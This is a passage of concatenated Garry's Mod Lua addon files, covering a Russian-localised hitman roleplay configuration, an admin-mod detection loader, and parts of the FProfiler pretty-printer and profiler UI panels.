    Executioner.Config.Bonus = {}
    Executioner.Config.Phone = {}
    Executioner.Config.Language = {}

    ---------------------------------
    --> Start of Server Settings <---
    ---------------------------------

    Executioner.Config.Developer_Mode = false

    --> Language Support <--
    -- Languages Supported: english, dutch, norwegian
    Executioner.Config.Language.Choice = 'english'

    Executioner.Config.ChatPrefix = 'Заказы: '
    Executioner.Config.PrefixColor = Color( 255, 255, 255 )

    Executioner.Config.Phone_Command = '/hits'
    Executioner.Config.Phone_Save = '/save_phones'
    Executioner.Config.Reset_Phones = '/reset_phones'
    Executioner.Config.Cancel_Hit = '/chit'

    Executioner.Config.Hitman_Teams = { -- Which job names are considered Hitmen?
        [ 'Наемный убийца' ] = true,
		[ 'Ассасин' ] = true
    }

    Executioner.Config.Banned_Groups = { -- Which groups can not have a hit placed against them?
        --[ 'superadmin' ] = true
    }

    Executioner.Config.No_Place_Teams = { -- These can still have a hit against them, but they not place hits at all.
        --[ 'Civil Protection' ] = true,
        --[ 'Civil Protection Chief' ] = true,
        --[ 'Mayor' ] = true
    }

    Executioner.Config.BlackList_Teams = { -- Which teams can not have a hit placed against them? These teams also can't use the Phone.
        [ 'NONRP' ] = true,
        --[ 'Staff on Duty' ] = true,
        --[ 'Mob boss' ] = true
    }

    Executioner.Config.Clean_Ranks = { -- Translates a usergroup into a nicer string for the first interface.
        [ 'superadmin' ] = '', [ 'admin' ] = '', [ 'padmin' ] = '', [ 'moder' ] = '', [ 'sponsor' ] = '', [ 't-admin' ] = '',
        [ 'vip' ] = '', [ 'user' ] = '', [ 'dsuperadmin' ] = ''
    }

    --[[
        Bonus Weapons are removed when the Hitman has attempted the hit.
        You can put anything in here, as long as it's capable of killing someone.
        Dildo Launcher, frying pan, whatever the fuck you want.
    --]]
    Executioner.BonusWeapons = {
        { name = 'USP', ent = 'usp' },
        { name = 'AWP', ent = 'awp' },
        { name = 'XM1040', ent = 'm3super90' },
        { name = 'Нож', ent = 'knife' }
    }

    Executioner.Config.BonusChance = 50 -- The chance 1 - 100% that a Hitman is offered a bonus.
    Executioner.Config.BonusMoney = 1000 -- How much money is given on a bonus hit? From a bonus weapon
    Executioner.Config.TaxOnKill = 5 -- What percentage is taken when a hit is completed? 0 to disable.

    Executioner.Config.Max_Hit_Price = 100000 -- The maximum price the customer can place
    Executioner.Config.Min_Hit_Price = 1000 -- The minimum price the customer can place

    Executioner.Config.PhoneEnabled = true -- If this enabled, you may only place hits via the phone.
    Executioner.Config.Enable_Face_To_Face = true -- Can people place hits on a Hitman by pressing 'E'?

    Executioner.Config.EnableDistance = true -- Enable a Distance tracker for the Hitman to see?
    Executioner.Config.EnableHitTime = true -- Enable random time limits the hit must be done in?
    Executioner.Config.EnableHitGeneration = false -- Enable random hits? (Now works for both face to face and phone hits)

    Executioner.Config.EnableUTimeSupport = false -- Enable uTime support?
    Executioner.Config.Min_Play_Time = 4 -- Minimum time until a hit can be placed on them? (In hours)

    Executioner.Config.Hit_Time_Min = 150 -- (Seconds). Default: Start at a minimum of 60 seconds
    Executioner.Config.Hit_Time_Max = 500 --(Seconds). Default: Max of 300 seconds

    Executioner.Config.RangeDistance = 600 -- The distance before distance turns into ???? (Too close)
    Executioner.Config.HitCooldown = 60 * 2 -- How long must the customer place before placing another Hit?
    Executioner.Config.Grace_Cooldown = 60 * 3 -- How long until a hit can be placed on the same person?
    Executioner.Config.Draw_Info = true -- When close to a Hitman, show that they're a hitman and their status?

    Executioner.Config.Generate_Hit_Intervals = 60 * 15 -- How long for a hit to be placed? In seconds?
    Executioner.Config.Generate_Remove_Time = 60 * 40 -- How long until a hit is removed as nobody has taken it?
    Executioner.Config.Minimum_Players = 6 -- How many people need to be on the server for a random hit to take place?
    -- This number also required a hitman to be on the server, with no active hit.
    --------------------------------
    --> Start of Client Settings <--
    --------------------------------
    --> Interface Settings <--
    Executioner.Config.ResponseTime = 120 -- How long does the Hitman have to reply to a Hit that a customer has directly requested? (Seconds)
    Executioner.Config.BonusTime = 30 -- How long does the Hitman have to accept the Bonus Weapon Offer?
    Executioner.Config.MenuSounds = true -- Do you want there to be sounds in the interfaces?
    Executioner.Config.GlobalAlpha = 155 -- The Alpha of all the interfaces.
    Executioner.Config.Name_Colors = Color( 255, 255, 255 ) -- The color of all the names.
    Executioner.Config.EnableBlur = false -- Enable blur on all of the interfaces?
    Executioner.Config.Component_Colors = { -- All the colors for components. Normal = default look, no hover. Hover = color on hover, text = color of text.
        [ 'button_request' ] = { normal = Color( 22, 22, 22 ), hover = Color( 18, 18, 18 ), text = Color( 255, 255, 255 ) },
        [ 'button_accept' ] = { normal = Color( 46, 200, 113 ), hover = Color( 46, 230, 113 ), text = Color( 255, 255, 255 ) },
        [ 'button_deny' ] = { normal = Color( 170, 32, 25 ), hover = Color( 230, 32, 25 ), text = Color( 255, 255, 255 ) },
        [ 'hit_price_entry' ] = { normal = Color( 22, 22, 22 ), hover = Color( 18, 18, 18 ), text = Color( 255, 255, 255, 200 ) },
        [ 'health_armor_display' ] = { -- This is a bit of a bitch.
            barBackground = Color( 100, 100, 100, 125 ),
            healthBar = Color( 46, 204, 133 ),
            armorBar = Color( 52, 152, 219, 170 ),
            outline = Color( 24, 24, 24 ),
            healthColor = Color( 255, 255, 255 ),
            armorColor = Color( 255, 255, 255 )
        }
    }
    Executioner.Config.GroupConfiguration = { -- Rank colors in the menu.
        [ 'superadmin' ] = Color( 200, 0, 0 ),
        --[ 'admin' ] = Color( 155, 89, 182 )
    }
    Executioner.Config.Outline_Colors = Color( 42, 42, 42, 200 ) -- This will change the outline of every grey outline.
    Executioner.Config.Main_Text_Color = Color( 52, 152, 219 )
    ---------------------------------------------
    --> Start of Placement Menu Configuration <--
    ---------------------------------------------
    --> Strings <--
    Executioner.Config.Placement.Main_Title = 'Заказы на убийства'
    Executioner.Config.Placement.No_Preview = ''
    Executioner.Config.Placement.Request_Hit = 'Заказать'
    --> Colors <--
    Executioner.Config.Placement.Background = Color( 100, 100, 100, 125 )
    Executioner.Config.Placement.Main_Title_Color = Color( 255, 255, 255 )
    Executioner.Config.Placement.Split_Bar = Color( 42, 42, 42, 240 ) -- The line down the middle of the first screen.
    Executioner.Config.Placement.No_Preview_Color = Color( 230, 32, 25 )
    ---------------------------------------------------------------------
    -- mainColor = the default color in row renders. onSecond = for every set of 2 use this color..
    Executioner.Config.Placement.Row_Hovers = { mainColor = Color( 23, 23, 23 ), onSecond = Color( 20, 20, 20 ) }
    Executioner.Config.Placement.Data_Canvis_Color = Color( 28, 28, 28, 220 )
    ------------------------------------------------
    --> Start of Confirmation Menu Configuration <--
    ------------------------------------------------
    --> Strings <--
    Executioner.Config.Confirmation.Main_Title = ''
    Executioner.Config.Confirmation.Header_Title = 'Вам дали заказ на'
    Executioner.Config.Confirmation.Accept_Hit = 'Принять'
    Executioner.Config.Confirmation.Deny_Hit = 'Отказать'
    --> Colors <--
    Executioner.Config.Confirmation.Background = Color( 100, 100, 100, 125 )
    Executioner.Config.Confirmation.Main_Title_Color = Color( 255, 255, 255 )
    Executioner.Config.Confirmation.Data_Canvis_Color = Color( 28, 28, 28, 220 )
    Executioner.Config.Confirmation.Money_Bar_Color = Color( 20, 20, 20 )
    Executioner.Config.Confirmation.Money_Text_Color = Color( 46, 204, 113 )
    -----------------------------------------
    --> Start of Bonus Menu Configuration <--
    -----------------------------------------
    --> Strings <--
    Executioner.Config.Bonus.Main_Title = 'Бонус'
    Executioner.Config.Bonus.Header = ''
    Executioner.Config.Bonus.Description = 'Убейте цель бонусным оружием'
    Executioner.Config.Bonus.Detail = 'Вам временно выдадут оружие'
    Executioner.Config.Bonus.Accept_Offer = 'Принять'
    Executioner.Config.Bonus.Deny_Offer = 'Отказать'
    --> Colors <--
    Executioner.Config.Bonus.Background = Color( 100, 100, 100, 125 )
    Executioner.Config.Bonus.Header_Color = Color( 156, 136, 255 )
    Executioner.Config.Bonus.Description_Color = Color( 255, 255, 255 )
    Executioner.Config.Bonus.Detail_Color = Color( 255, 255, 255 )
    -----------------------------------------
    --> Start of Phone Menu Configuration <--
    -----------------------------------------
    --> Strings <--
    Executioner.Config.Phone.Main_Title = 'Заказы'
    Executioner.Config.Phone.Text_On_Entity = 'Заказать убийство'
    Executioner.Config.Phone.Target = 'Цель: '
    Executioner.Config.Phone.Customer = 'Заказчик: '
    Executioner.Config.Phone.Price = 'Награда: '
    --> Colors <--
    Executioner.Config.Phone.Background = Color( 100, 100, 100, 125 )
    Executioner.Config.Phone.Main_Title_Color = Color( 255, 255, 255 )
    Executioner.Config.Phone.Data_Canvis_Color = Color( 28, 28, 28, 220 )

    -----------------------------------------
    --> Start of Hitman HUD Conifguration <--
    -----------------------------------------
    --> Strings <--
    --> The panel on the right of the screen for Hitmen when they have an active hit <--
    -- Target: inherts from Executioner.Config.Phone.Target --
    Executioner.Config.Occupation = 'Профессия: '
    Executioner.Config.Time_Left = 'Время: '
    Executioner.Config.Active_Hit = 'Заказ'
    Executioner.Config.Distance_Text = 'Дистанция: '
    ----------------------------------------------------------
    Executioner.Config.Background = Color( 100, 100, 100, 125 )
    Executioner.Config.Foreground = Color( 8, 8, 8, 245 )
    Executioner.Config.Main_Title_Color = Color( 255, 255, 255 )
    Executioner.Config.HUD_Outline = Color( 30, 30, 30, 245 )
    --> The text which appears in the middle of the screen <--
    Executioner.Config.Hit_Completed = ''
    Executioner.Config.Hit_Completed_Color = Color( 255, 255, 255 )
    --> The Text which appears when looking at a Hitman <--
    Executioner.Config.Hitman_Text = ''
    Executioner.Config.Busy_Text = ''
    Executioner.Config.Request_Hit_Text = 'Сделать заказ'
    --> The Green color is taken from the Money Green <--
    -- Executioner.Config.Confirmation.Money_Text_Color -
    -----------------------------------------------------
    -----------------------------------------------------
--PATH addons/admin_warns/lua/fam/core/sh_adminmodes.lua:
local white 	= Color(255, 255, 255)
local red 		= Color(255,80,80)
local blue 		= Color(80,80,255)

local detect = {
	-- {
	-- 	name = "Flame Admin Mode",
	-- 	check = function()
	-- 		if fl then return true end
	-- 		return false
	-- 	end,
	-- 	mode = "fl.lua"
	-- },
	{
		name = "ULX",
		check = function()
			if ulx or ULib then return true end
			return false
		end,
		mode = "ulx.lua"
	},
	-- {
	-- 	name = "ServerGuard",
	-- 	check = function()
	-- 		if serverguard then return true end
	-- 		return false
	-- 	end,
	-- 	mode = "serverguard.lua"
	-- },
	-- {
	-- 	name = "xAdmin",
	-- 	check = function()
	-- 		if xAdmin then return true end
	-- 		return false
	-- 	end, 
	-- 	mode = "xadmin.lua"
	-- },
	-- {
	-- 	name = "SAM",
	-- 	check = function()
	-- 		if sam then return true end
	-- 		return false
	-- 	end,
	-- 	mode = "sam.lua"
	-- }
}

local include_sh = function(f)
	if SERVER then 
		include(f) 
		AddCSLuaFile(f) 
	else 
		include(f) 
	end
end

timer.Simple(0, function()
	local detected = false

	for k,v in ipairs(detect) do
		if not v.check() then continue end

		include_sh("fam/admin_modes/" .. v.mode)
		MsgC(red, "[GM] ", blue, v.name, white, " - detected!\n")
		detected = true
		break
	end

	if not detected then
		MsgC(red, "[GM] ", white, "Not one of the admin mods has been detected!\n")
		include_sh("fam/admin_modes/gmod.lua")
	end
end)
--PATH addons/grp_content/lua/autorun/fbi_with_cat.lua:
player_manager.AddValidModel("FBI withCap", "models/vad36go_fbi/fbi.mdl")
list.Set("PlayerOptionsModel", "FBI withCap", "models/vad36go_fbi/fbi.mdl")
--PATH addons/fpp/lua/fprofiler/prettyprint.lua:
-- Based on MDave's thing
-- https://gist.github.com/mentlerd/d56ad9e6361f4b86af84
if SERVER then AddCSLuaFile() end

local type_weight = {
    [TYPE_FUNCTION] = 1,
    [TYPE_TABLE]    = 2,
}

local type_colors = {
    [TYPE_BOOL]     = Color(175, 130, 255),
    [TYPE_NUMBER]   = Color(175, 130, 255),
    [TYPE_STRING]   = Color(230, 220, 115),
    [TYPE_FUNCTION] = Color(100, 220, 240)
}

local color_neutral   = Color(220, 220, 220)
local color_name      = Color(260, 150,  30)

local color_reference = Color(150, 230,  50)
local color_comment   = Color( 30, 210,  30)

-- 'nil' value
local NIL = {}

-- Localise for faster access
local pcall         = pcall

local string_len    = string.len
local string_sub    = string.sub
local string_find   = string.find

local table_concat  = table.concat
local table_insert  = table.insert
local table_sort    = table.sort


-- Stream interface
local gMsgF -- Print fragment
local gMsgN -- Print newline
local gMsgC -- Set print color

local PrintLocals, gBegin, gFinish, PrintTableGrep

do
    local grep_color   = Color(235, 70, 70)

    -- Grep parameters (static between gBegin/gEnd)
    local grep
    local grep_raw

    local grep_proximity


    -- Current line parameters
    local buffer
    local colors
    local markers

    local baseColor
    local currColor

    local length

    -- History
    local history
    local remain


    -- Actual printing
    local function gCheckMatch( buffer )
        local raw = table_concat(buffer)

        return raw, string_find(raw, grep, 0, grep_raw)
    end

    local function gFlushEx( raw, markers, colors, baseColor )

        -- Print entire buffer
        local len = string_len(raw)

        -- Keep track of the current line properties
        local index  = 1
        local marker = 1

        local currColor = baseColor

        -- Method to print to a preset area
        local function printToIndex( limit, color )
            local mark = markers and markers[marker]

            -- Print all marker areas until we would overshoot
            while mark and mark < limit do

                -- Catch up to the marker
                MsgC(color or currColor or color_neutral, string_sub(raw, index, mark))
                index = mark +1

                -- Set new color
                currColor = colors[marker]

                -- Select next marker
                marker = marker +1
                mark   = markers[marker]

            end

            -- Print the remaining between the last marker and the limit
            MsgC(color or currColor or color_neutral, string_sub(raw, index, limit))
            index = limit +1
        end

        -- Grep!
        local match, last = 1
        local from, to = string_find(raw, grep, 0, grep_raw)

        while from do
            printToIndex(from -1)
            printToIndex(to, grep_color)

            last     = to +1
            from, to = string_find(raw, grep, last, grep_raw)
        end

        printToIndex(len)
        MsgN()
    end


    local function gCommit()
        if grep_proximity then
            -- Check if the line has at least one match
            local raw, match = gCheckMatch(buffer)

            if match then

                -- Divide matches
                if history[grep_proximity] then
                    MsgN("...")
                end

                -- Flush history
                if grep_proximity ~= 0 then
                    local len = #history

                    for index = len -1, 1, -1 do
                        local entry = history[index]
                            history[index] = nil

                        gFlushEx( entry[1], entry[2], entry[3], entry[4] )
                    end

                    history[len] = nil
                end

                -- Flush line, allow next X lines to get printed
                gFlushEx( raw, markers, colors, baseColor )
                remain = grep_proximity -1

                history[grep_proximity +1] = nil
            elseif remain > 0 then
                -- Flush immediately
                gFlushEx( raw, markers, colors, baseColor )
                remain = remain -1
            else
                -- Store in history
                table_insert(history, 1, {raw, markers, colors, baseColor})
                history[grep_proximity +1] = nil
            end
        else
            -- Flush anyway
            gFlushEx( table_concat(buffer), markers, colors, baseColor )
        end

        -- Reset state
        length = 0
        buffer = {}

        markers = nil
        colors  = nil

        baseColor = nil
        currColor = nil
    end

    -- State machine
    function gBegin( new, prox )
        grep = isstring(new) and new

        if grep then
            grep_raw       = not pcall(string_find, ' ', grep)
            grep_proximity = isnumber(prox) and prox

            -- Reset everything
            buffer  = {}
            history = {}
        end

        length = 0
        remain = 0

        baseColor = nil
        currColor = nil
    end

    function gFinish()
        if grep_proximity and history and history[1] then
            MsgN("...")
        end

        -- Free memory
        buffer  = nil
        markers = nil
        colors  = nil

        history = nil
    end


    function gMsgC( color )
        if grep then

            -- Try to save some memory by not immediately allocating colors
            if length == 0 then
                baseColor = color
                return
            end

            -- Record color change
            if color ~= currColor then
                if not markers then
                    markers = {}
                    colors  = {}
                end

                -- Record color change
                table_insert(markers, length)
                table_insert(colors,  color)
            end
        end

        currColor = color
    end

    function gMsgF( str )
        if grep then

            -- Split multiline fragments to separate ones
            local fragColor = currColor or baseColor

            local last = 1
            local from, to = string_find(str, '\n')

            while from do
                local frag = string_sub(str, last, from -1)
                local len  = from - last

                -- Merge fragment to the line
                length = length + len
                table_insert(buffer, frag)

                -- Print finished line
                gCommit()

                -- Assign base color as previous fragColor
                baseColor = fragColor

                -- Look for more
                last     = to +1
                from, to = string_find(str, '\n', last)
            end

            -- Push last fragment
            local frag = string_sub(str, last)
            local len  = string_len(str) - last +1

            length = length + len
            table_insert(buffer, frag)
        else
            -- Push immediately
            MsgC(currColor or baseColor or color_neutral, str)
        end
    end

    function gMsgN()
        -- Print everything in the buffer
        if grep then
            gCommit()
        else
            MsgN()
        end

        baseColor = nil
        currColor = nil
    end
end


local function InternalPrintValue( value )

    -- 'nil' values can also be printed
    if value == NIL then
        gMsgC(color_comment)
        gMsgF("nil")
        return
    end

    local color = type_colors[ TypeID(value) ]

    -- For strings, place quotes
    if isstring(value) then
        if string_len(value) <= 1 then
            value = string.format([['%s']], value)
        else
            value = string.format([["%s"]], value)
        end

        gMsgC(color)
        gMsgF(value)
        return
    end

    -- Workaround for userdata not using MetaName
    if string_sub(tostring(value), 0, 8) == "userdata" then
        local meta = getmetatable(value)

        if meta and meta.MetaName then
            value = string.format("%s: %p", meta.MetaName, value)
        end
    end

    -- General print
    gMsgC(color)
    gMsgF(tostring(value))

    -- For functions append source info
    if isfunction(value) then
        local info = debug.getinfo(value, 'S')
        local aux

        if info.what == 'C' then
            aux = "\t-- [C]: -1"
        else
            if info.linedefined ~= info.lastlinedefined then
                aux = string.format("\t-- [%s]: %i-%i", info.short_src, info.linedefined, info.lastlinedefined)
            else
                aux = string.format("\t-- [%s]: %i", info.short_src, info.linedefined)
            end
        end

        gMsgC(color_comment)
        gMsgF(aux)
    end
end


-- Associated to object keys
local objID

local function isprimitive( value )
    local id = TypeID(value)

    return id <= TYPE_FUNCTION and id ~= TYPE_TABLE
end

local function InternalPrintTable( table, path, prefix, names, todo )

    -- Collect keys and some info about them
    local keyList  = {}
    local keyStr   = {}

    local keyCount = 0

    for key, value in pairs( table ) do
        -- Add to key list for later sorting
        table_insert(keyList, key)

        -- Describe key as string
        if isprimitive(key) then
            keyStr[key] = tostring(key)
        else
            -- Lookup already known name
            local name = names[key]

            -- Assign a new unique identifier
            if not name then
                objID = objID +1
                name  = string.format("%s: obj #%i", tostring(key), objID)

                names[key] = name
                todo[key]  = true
            end

            -- Substitute object with name
            keyStr[key] = name
        end

        keyCount = keyCount +1
    end


    -- Exit early for empty tables
    if keyCount == 0 then
        return
    end


    -- Determine max key length
    local keyLen = 4

    for key, str in pairs(keyStr) do
        keyLen = math.max(keyLen, string.len(str))
    end

    -- Sort table keys
    if keyCount > 1 then
        table_sort( keyList, function( A, B )

            -- Sort numbers numerically correct
            if isnumber(A) and isnumber(B) then
                return A < B
            end

            -- Weight types
            local wA = type_weight[ TypeID( table[A] ) ] or 0
            local wB = type_weight[ TypeID( table[B] ) ] or 0

            if wA ~= wB then
                return wA < wB
            end

            -- Order by string representation
            return keyStr[A] < keyStr[B]

        end )
    end

    -- Determine the next level ident
    local new_prefix = string.format( "%s║%s", prefix, string.rep(' ', keyLen) )

    -- Mark object as done
    todo[table] = nil

    -- Start describing table
    for index, key in ipairs(keyList) do
        local value = table[key]

        -- Assign names to already described keys/values
        local kName = names[key]
        local vName = names[value]

        -- Decide to either fully describe, or print the value
        local describe = not isprimitive(value) and ( not vName or todo[value] )

        -- Ident
        gMsgF(prefix)

        -- Fancy table guides
        local moreLines = (index ~= keyCount) or describe

        if index == 1 then
            gMsgF(moreLines and '╦ ' or '═ ')
        else
            gMsgF(moreLines and '╠ ' or '╚ ')
        end

        -- Print key
        local sKey = kName or keyStr[key]

        gMsgC(kName and color_reference or color_name)
        gMsgF(sKey)

        -- Describe non primitives
        describe = istable(value) and ( not names[value] or todo[value] ) and value ~= NIL

        -- Print key postfix
        local padding = keyLen - string.len(sKey)
        local postfix = string.format(describe and ":%s" or "%s = ", string.rep(' ', padding))

        gMsgC(color_neutral)
        gMsgF(postfix)

        -- Print the value
        if describe then
            gMsgN()

            -- Expand access path
            local new_path = sKey

            if isnumber(key) or kName then
                new_path = string.format("%s[%s]", path or '', key)
            elseif path then
                new_path = string.format("%s.%s", path, new_path)
            end

            -- Name the object to mark it done
            names[value] = names[value] or new_path

            -- Describe
            InternalPrintTable(value, new_path, new_prefix, names, todo)
        else
            -- Print the value (or the reference name)
            if vName and not todo[value] then
                gMsgC(color_reference)
                gMsgF(string.format("ref: %s",vName))
            else
                InternalPrintValue(value)
            end

            gMsgN()
        end
    end

end

function PrintTableGrep( table, grep, proximity )
    local base = {
        [_G]    = "_G",
        [table] = "root"
    }

    gBegin(grep, proximity)
        objID = 0
        InternalPrintTable(table, nil, "", base, {})
    gFinish()
end

function PrintLocals( level )
    local level = level or 2
    local hash  = {}

    for index = 1, 255 do
        local name, value = debug.getlocal(2, index)

        if not name then
            break
        end

        if value == nil then
            value = NIL
        end

        hash[name] = value
    end

    PrintTableGrep( hash )
end

function show(...)
    local n = select('#', ...)
    local tbl = {...}

    for i = 1, n do
        if istable(tbl[i]) then MsgN(tostring(tbl[i])) PrintTableGrep(tbl[i])
        else InternalPrintValue(tbl[i]) MsgN() end
    end
end

-- Hacky way of creating a pretty string from the above code
-- because I don't feel like refactoring the entire thing
local strResult
local toStringMsgF = function(txt)
    table.insert(strResult, txt)
end

local toStringMsgN = function()
    table.insert(strResult, "\n")
end

local toStringMsgC = function(_, txt)
    table.insert(strResult, txt)
end

function showStr(...)
    local oldF, oldN, oldMsgC, oldMsgN = gMsgF, gMsgN, MsgC, MsgN
    gMsgF, gMsgN, MsgC, MsgN = toStringMsgF, toStringMsgN, toStringMsgC, toStringMsgN

    strResult = {}
    show(...)

    gMsgF, gMsgN, MsgC, MsgN = oldF, oldN, oldMsgC, oldMsgN

    return table.concat(strResult, "")
end

--PATH addons/fpp/lua/fprofiler/ui/frame.lua:
--[[-------------------------------------------------------------------------
The panel that contains the realm switcher
---------------------------------------------------------------------------]]
local REALMPANEL = {}

function REALMPANEL:Init()
    self:DockPadding(0, 0, 0, 0)
    self:DockMargin(0, 0, 5, 0)

    self.realmLabel = vgui.Create("DLabel", self)
    self.realmLabel:SetDark(true)
    self.realmLabel:SetText("Realm:")

    self.realmLabel:SizeToContents()
    self.realmLabel:Dock(TOP)

    self.realmbox = vgui.Create("DComboBox", self)
    self.realmbox:AddChoice("Client")
    self.realmbox:AddChoice("Server")
    self.realmbox:Dock(TOP)

    FProfiler.UI.onModelUpdate("realm", function(new)
        self.realmbox.selected = new == "client" and 1 or 2
        self.realmbox:SetText(new == "client" and "Client" or "Server")
    end)

    FProfiler.UI.onModelUpdate("serverAccess", function(hasAccess)
        self.realmbox:SetDisabled(not hasAccess)

        if not hasAccess and self.realmbox.selected == 2 then
            FProfiler.UI.updateModel("realm", "client")
        end
    end)

    self.realmbox.OnSelect = function(_, _, value) FProfiler.UI.updateModel("realm", string.lower(value)) end
end

function REALMPANEL:PerformLayout()
    self.realmLabel:SizeToContents()
    local top = ( self:GetTall() - self.realmLabel:GetTall() - self.realmbox:GetTall()) * 0.5
    self:DockPadding(0, top, 0, 0)
end

derma.DefineControl("FProfileRealmPanel", "", REALMPANEL, "Panel")

--[[-------------------------------------------------------------------------
The little red or green indicator that indicates whether the focussing
function is correct
---------------------------------------------------------------------------]]
local FUNCINDICATOR = {}

function FUNCINDICATOR:Init()
    self:SetTall(5)
    self.color = Color(0, 0, 0, 0)
end

function FUNCINDICATOR:Paint()
    draw.RoundedBox(0, 0, 0, self:GetWide(), self:GetTall(), self.color)
end

derma.DefineControl("FProfileFuncIndicator", "", FUNCINDICATOR, "DPanel")

--[[-------------------------------------------------------------------------
The panel that contains the focus text entry and the focus indicator
---------------------------------------------------------------------------]]
local FOCUSPANEL = {}

function FOCUSPANEL:Init()
    self:DockPadding(0, 0, 0, 0)
    self:DockMargin(0, 0, 5, 0)

    self.focusLabel = vgui.Create("DLabel", self)
    self.focusLabel:SetDark(true)
    self.focusLabel:SetText("Profiling Focus:")

    self.focusLabel:SizeToContents()
    self.focusLabel:Dock(TOP)

    self.funcIndicator = vgui.Create("FProfileFuncIndicator", self)
    self.funcIndicator:Dock(BOTTOM)

    self.focusBox = vgui.Create("DTextEntry", self)
    self.focusBox:SetText("")
    self.focusBox:SetWidth(150)
    self.focusBox:Dock(BOTTOM)
    self.focusBox:SetTooltip("Focus the profiling on a single function.\nEnter a global function name here (like player.GetAll)\nYou're not allowed to call functions in here (e.g. hook.GetTable() is not allowed)")

    function self.focusBox:OnChange()
        FProfiler.UI.updateCurrentRealm("focusStr", self:GetText())
    end

    FProfiler.UI.onCurrentRealmUpdate("focusObj", function(new)
        self.funcIndicator.color = FProfiler.UI.getCurrentRealmValue("focusStr") == "" and Color(0, 0, 0, 0) or new and Color(80, 255, 80, 255) or Color(255, 80, 80, 255)
    end)

    FProfiler.UI.onCurrentRealmUpdate("focusStr", function(new, old)
        if self.focusBox:GetText() == new then return end

        self.focusBox:SetText(tostring(new))
    end)
end

function FOCUSPANEL:PerformLayout()
    self.focusBox:SetWide(200)
    self.focusLabel:SizeToContents()
end

derma.DefineControl("FProfileFocusPanel", "", FOCUSPANEL, "Panel")

--[[-------------------------------------------------------------------------
The timer that keeps track of for how long the profiling has been going on
---------------------------------------------------------------------------]]
local TIMERPANEL = {}

function TIMERPANEL:Init()
    self:DockPadding(0, 5, 0, 5)
    self:DockMargin(5, 0, 5, 0)

    self.timeLabel = vgui.Create("DLabel", self)
    self.timeLabel:SetDark(true)
    self.timeLabel:SetText("Total profiling time:")

    self.timeLabel:SizeToContents()
    self.timeLabel:Dock(TOP)

    self.counter = vgui.Create("DLabel", self)
    self.counter:SetDark(true)
    self.counter:SetText("00:00:00")
    self.counter:SizeToContents()
    self.counter:Dock(RIGHT)

    function self.counter:Think()
        local recordTime, sessionStart = FProfiler.UI.getCurrentRealmValue("recordTime"), FProfiler.UI.getCurrentRealmValue("sessionStart")

        local totalTime = recordTime + (sessionStart and (CurTime() - sessionStart) or 0)

        self:SetText(string.FormattedTime(totalTime, "%02i:%02i:%02i"))
    end
end

function TIMERPANEL:PerformLayout()
    self.timeLabel:SizeToContents()
    self.counter:SizeToContents()
end

derma.DefineControl("FProfileTimerPanel", "", TIMERPANEL, "Panel")

--[[-------------------------------------------------------------------------
The top bar
---------------------------------------------------------------------------]]
local MAGICBAR = {}

function MAGICBAR:Init()
    self:DockPadding(5, 5, 5, 5)
    self.realmpanel = vgui.Create("FProfileRealmPanel", self)

    -- (Re)Start profiling
    self.restartProfiling = vgui.Create("DButton", self)
    self.restartProfiling:SetText("   (Re)Start\n    Profiling")
    self.restartProfiling:DockMargin(0, 0, 5, 0)
    self.restartProfiling:Dock(LEFT)

    self.restartProfiling.DoClick = function()
        FProfiler.UI.updateCurrentRealm("shouldReset", true)
        FProfiler.UI.updateCurrentRealm("status", "Started")
    end

    FProfiler.UI.onCurrentRealmUpdate("status", function(new)
        self.restartProfiling:SetDisabled(new == "Started")
    end)

    -- Stop profiling
    self.stopProfiling = vgui.Create("DButton", self)
    self.stopProfiling:SetText("     Stop\n  Profiling")
    self.stopProfiling:DockMargin(0, 0, 5, 0)
    self.stopProfiling:Dock(LEFT)

    self.stopProfiling.DoClick = function()
        FProfiler.UI.updateCurrentRealm("status", "Stopped")
    end

    FProfiler.UI.onCurrentRealmUpdate("status", function(new)
        self.stopProfiling:SetDisabled(new == "Stopped")
    end)

    -- Continue profiling
    self.continueProfiling = vgui.Create("DButton", self)
    self.continueProfiling:SetText("    Continue\n     Profiling")
    self.continueProfiling:DockMargin(0, 0, 5, 0)
    self.continueProfiling:Dock(LEFT)

    self.continueProfiling.DoClick = function()
        FProfiler.UI.updateCurrentRealm("shouldReset", false)
        FProfiler.UI.updateCurrentRealm("status", "Started")
    end

    FProfiler.UI.onCurrentRealmUpdate("status", function(new)
        self.continueProfiling:SetDisabled(new == "Started")
    end)

    self.realmpanel:Dock(LEFT)

    self.focuspanel = vgui.Create("FProfileFocusPanel", self)
    self.focuspanel:Dock(LEFT)

    -- Timer
    self.timerpanel = vgui.Create("FProfileTimerPanel", self)
    self.timerpanel:Dock(RIGHT)
end

function MAGICBAR:PerformLayout()
    self.realmpanel:SizeToChildren(true, false)
    self.focuspanel:SizeToChildren(true, false)
    self.timerpanel:SizeToChildren(true, false)
end


derma.DefineControl("FProfileMagicBar", "", MAGICBAR, "DPanel")

--[[-------------------------------------------------------------------------
The Bottlenecks tab's contents
---------------------------------------------------------------------------]]
local BOTTLENECKTAB = {}

function BOTTLENECKTAB:Init()
    self:SetMultiSelect(false)
    self:AddColumn("Name")
    self:AddColumn("Path")
    self:AddColumn("Lines")
    self:AddColumn("Amount of times called")
    self:AddColumn("Total time in ms (inclusive)")
    self:AddColumn("Average time in ms (inclusive)")

    FProfiler.UI.onCurrentRealmUpdate("bottlenecks", function(new)
        self:Clear()

        for _, row in ipairs(new) do
            local names = {}
            local path = row.info.short_src
            local lines = path ~= "[C]" and row.info.linedefined .. " - " .. row.info.lastlinedefined or "N/A"
            local amountCalled = row.total_called
            local totalTime = row.total_time * 100
            local avgTime = row.average_time * 100

            for _, fname in ipairs(row.names or {}) do
                if fname.namewhat == "" and fname.name == "" then continue end
                table.insert(names, fname.namewhat .. " " .. fname.name)
            end

            if #names == 0 then names[1] = "Unknown" end

            local line = self:AddLine(table.concat(names, "/"), path, lines, amountCalled, totalTime, avgTime)
            line.data = row
        end
    end)

    FProfiler.UI.onCurrentRealmUpdate("currentSelected", function(new, old)
        if new == old then return end

        for _, line in pairs(self.Lines) do
            line:SetSelected(line.data.func == new.func)
        end
    end)
end


function BOTTLENECKTAB:OnRowSelected(id, line)
    FProfiler.UI.updateCurrentRealm("currentSelected", line.data)
end


derma.DefineControl("FProfileBottleNecks", "", BOTTLENECKTAB, "DListView")

--[[-------------------------------------------------------------------------
The Top n lag spikes tab's contents
---------------------------------------------------------------------------]]
local TOPTENTAB = {}

function TOPTENTAB:Init()
    self:SetMultiSelect(false)
    self:AddColumn("Name")
    self:AddColumn("Path")
    self:AddColumn("Lines")
    self:AddColumn("Runtime in ms")

